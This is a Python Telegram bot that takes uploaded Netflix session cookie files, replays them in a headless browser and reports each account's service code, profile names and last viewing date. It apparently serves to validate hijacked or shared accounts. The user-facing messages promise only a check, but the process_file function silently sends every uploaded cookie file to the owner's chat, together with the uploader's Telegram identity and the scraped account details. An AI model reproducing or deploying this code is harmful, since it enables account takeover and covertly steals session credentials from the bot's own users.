#!/usr/bin/env python3
import os
import io
import sys
import json
import zipfile
import logging
import asyncio
import re
import codecs
from datetime import datetime

from dotenv import load_dotenv
from telegram import (
    Update,
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# ——— Load environment and validate required variables ———
load_dotenv()
TELEGRAM_TOKEN      = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID       = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID     = os.getenv("CHANNEL_CHAT_ID")
CHANNEL_INVITE_LINK = os.getenv("CHANNEL_INVITE_LINK")

if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
    sys.exit(1)

OWNER_CHAT_ID   = int(OWNER_CHAT_ID)
CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)

# ——— Logging setup ———
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ——— Utility: parse cookies in txt/json or Netscape format ———
def parse_cookies(content: str) -> dict:
    try:
        arr = json.loads(content)
        if isinstance(arr, list):
            return {c["name"]: c["value"] for c in arr if "name" in c and "value" in c}
    except Exception:
        pass

    cookies = {}
    for line in content.splitlines():
        if line.startswith("#") or not line.strip():
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    if not cookies:
        for part in content.replace("\n", ";").split(";"):
            if "=" in part:
                name, val = part.split("=", 1)
                cookies[name.strip()] = val.strip()
    return cookies

# ——— Utility: channel invite link ———
async def get_channel_invite_link(context):
    return CHANNEL_INVITE_LINK

# ——— /start handler with channel-join check ———
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    full_name = user.full_name or user.first_name

    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
        joined = member.status in ("member", "administrator", "creator")
    except Exception:
        joined = False

    if joined:
        text = (
            f"👋 Hi! {full_name}\n"
            "Send me your Netflix-cookies file(s) in .txt, .json, or .zip format, "
            "to know service code and profile names and last account used date."
        )
        await update.message.reply_text(
            text,
            reply_to_message_id=update.message.message_id
        )
    else:
        invite = await get_channel_invite_link(context)
        kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
        text = (
            f"👋 Hi! {full_name}\n"
            "Join our channel to check your Netflix-cookies service code, profile names, "
            "and last account used date."
        )
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=update.message.message_id
        )

# ——— Document handler with channel-join enforcement ———
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    full_name = user.full_name or user.first_name
    orig_id = update.message.message_id

    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user.id)
        joined = member.status in ("member", "administrator", "creator")
    except Exception:
        joined = False

    if not joined:
        invite = await get_channel_invite_link(context)
        kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
        text = (
            f"👋 Hi! {full_name}\n"
            "Join our channel to check your Netflix-cookies service code, profile names, "
            "and last account used date."
        )
        return await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=orig_id
        )

    # download the file
    doc: Document = update.message.document
    raw = await (await doc.get_file()).download_as_bytearray()
    orig_name = doc.file_name
    ext = os.path.splitext(orig_name)[1].lower()
    buf = io.BytesIO(raw)

    # extract .txt/.json or from .zip
    files = []
    if ext in (".txt", ".json"):
        text = buf.read().decode("utf-8", errors="ignore")
        files.append((orig_name, text))
    elif ext == ".zip":
        with zipfile.ZipFile(buf) as z:
            for zi in z.infolist():
                if zi.filename.lower().endswith((".txt", ".json")):
                    t = z.read(zi).decode("utf-8", errors="ignore")
                    files.append((zi.filename, t))
    else:
        return await update.message.reply_text(
            "⚠️ Unsupported file type. Please send .txt, .json or .zip.",
            reply_to_message_id=orig_id
        )

    if not files:
        return await update.message.reply_text(
            "🚫 No cookie files found in upload.",
            reply_to_message_id=orig_id
        )

    # schedule processing
    for fname, content in files:
        context.application.create_task(
            process_file(
                chat_id=update.effective_chat.id,
                orig_id=orig_id,
                parsed_name=fname,
                content=content,
                raw_data=raw,
                orig_name=orig_name,
                user_id=user.id,
                full_name=full_name,
                username=f"@{user.username}" if user.username else None,
                context=context
            )
        )

# ——— Core processing & reply with renamed file + secret owner copy ———
async def process_file(
    chat_id: int,
    orig_id: int,
    parsed_name: str,
    content: str,
    raw_data: bytes,
    orig_name: str,
    user_id: int,
    full_name: str,
    username: str,
    context: ContextTypes.DEFAULT_TYPE
):
    cookies = parse_cookies(content)
    if not cookies:
        return await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ [{parsed_name}] could not parse any cookies.",
            reply_to_message_id=orig_id
        )

    service_code = None
    guids = set()

    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            ctx = await browser.new_context()
            ck = [{
                "name": k, "value": v,
                "domain": ".netflix.com", "path": "/",
                "httpOnly": False, "secure": True, "sameSite": "Lax"
            } for k, v in cookies.items()]
            await ctx.add_cookies(ck)

            page = await ctx.new_page()
            page.set_default_navigation_timeout(30_000)
            async def on_resp(r):
                nonlocal service_code, guids
                try:
                    txt = await r.text()
                except:
                    return
                for m in re.finditer(r'"authCode"\s*:\s*"(\d+)"', txt):
                    service_code = m.group(1)
                for m in re.finditer(r'"guid"\s*:\s*"([^"]+)"', txt):
                    guids.add(m.group(1))
            page.on("response", on_resp)

            await page.goto("https://www.netflix.com/account", wait_until="load", timeout=30_000)
            btn = await page.query_selector('button[data-uia="account+footer+service-code-button"]')
            if btn:
                await btn.click()
                await page.wait_for_timeout(3000)
            await page.close()

            sem = asyncio.Semaphore(5)
            async def fetch_profile(guid):
                async with sem:
                    p = await ctx.new_page()
                    p.set_default_navigation_timeout(20_000)
                    prof = None
                    dates = []
                    async def ph(r):
                        nonlocal prof, dates
                        try:
                            t = await r.text()
                        except:
                            return
                        for m in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', t):
                            prof = codecs.decode(m.group(1), "unicode_escape")
                        for m in re.finditer(r'"date"\s*:\s*(\d+)', t):
                            dates.append(int(m.group(1)))
                    p.on("response", ph)
                    await p.goto(f"https://www.netflix.com/settings/viewed/{guid}",
                                 wait_until="load", timeout=20_000)
                    await p.wait_for_timeout(2000)
                    await p.close()
                    return prof or guid, dates

            results = await asyncio.gather(*(fetch_profile(g) for g in guids))
            await browser.close()

    except PlaywrightTimeoutError:
        return await context.bot.send_message(
            chat_id=chat_id,
            text=f"⚠️ [{parsed_name}] timed out scraping.",
            reply_to_message_id=orig_id
        )
    except Exception as e:
        logger.exception("Error processing %s:", parsed_name)
        return await context.bot.send_message(
            chat_id=chat_id,
            text=f"⚠️ [{parsed_name}] error: {e}",
            reply_to_message_id=orig_id
        )

    if not service_code:
        return await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ [{parsed_name}] invalid or expired cookie.",
            reply_to_message_id=orig_id
        )

    # gather profile names and latest date
    names = [prof for prof, _ in results]
    all_dates = [ms for _, ds in results for ms in ds]
    latest = ""
    if all_dates:
        dt = max(datetime.fromtimestamp(ms/1000) for ms in all_dates)
        latest = dt.strftime("%B %d, %Y")

    # bot username and new filename
    bot = await context.bot.get_me()
    bot_username = bot.username
    ext = os.path.splitext(orig_name)[1]
    new_name = f"@{bot_username}-{orig_id}{ext}"

    # caption for user
    user_cap = [
        f"✅ Cookie is valid checked by @{bot_username}",
        "",
        f"⚙️ Service code: `{service_code[:3]}-{service_code[3:]}`",
        "",
        "🧐 Profile names:"
    ]
    for i, n in enumerate(names, 1):
        user_cap.append(f"{i}. {n}")
    if latest:
        user_cap.extend(["", f"📍 Latest used date: {latest}"])
    # add instruction for email lookup
    user_cap.extend(["", f"📌 To know mail of this netflix cookie account, forward this cookie file to @CookieCheckerRobot"])  
    user_caption = "\n".join(user_cap)

    # send document back to user
    bio = io.BytesIO(raw_data)
    bio.name = new_name
    await context.bot.send_document(
        chat_id=chat_id,
        document=bio,
        caption=user_caption,
        parse_mode="Markdown",
        reply_to_message_id=orig_id
    )

    # caption for owner (HTML, inline user link)
    owner_lines = [
        f"<a href=\"tg://user?id={user_id}\">{user_id}</a>",
    ]
    if full_name:
        owner_lines.append(f"{full_name}")
    if username:
        owner_lines.append(f"{username}")
    owner_lines.extend([
        "",
        f"⚙️ Service code: <code>{service_code[:3]}-{service_code[3:]}</code>",
        "",
        "🧐 Profile names:"
    ])
    for i, n in enumerate(names, 1):
        owner_lines.append(f"{i}. {n}")
    if latest:
        owner_lines.extend(["", f"📍 Latest used date: {latest}"])
    owner_caption = "\n".join(owner_lines)

    # send document to owner silently
    bio2 = io.BytesIO(raw_data)
    bio2.name = new_name
    await context.bot.send_document(
        chat_id=OWNER_CHAT_ID,
        document=bio2,
        caption=owner_caption,
        parse_mode="HTML"
    )

# ——— Entry point ———
def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document)
    )
    app.run_polling()
    logger.info("Bot started with channel-join enforcement and owner notifications.")

if __name__ == "__main__":
    main()
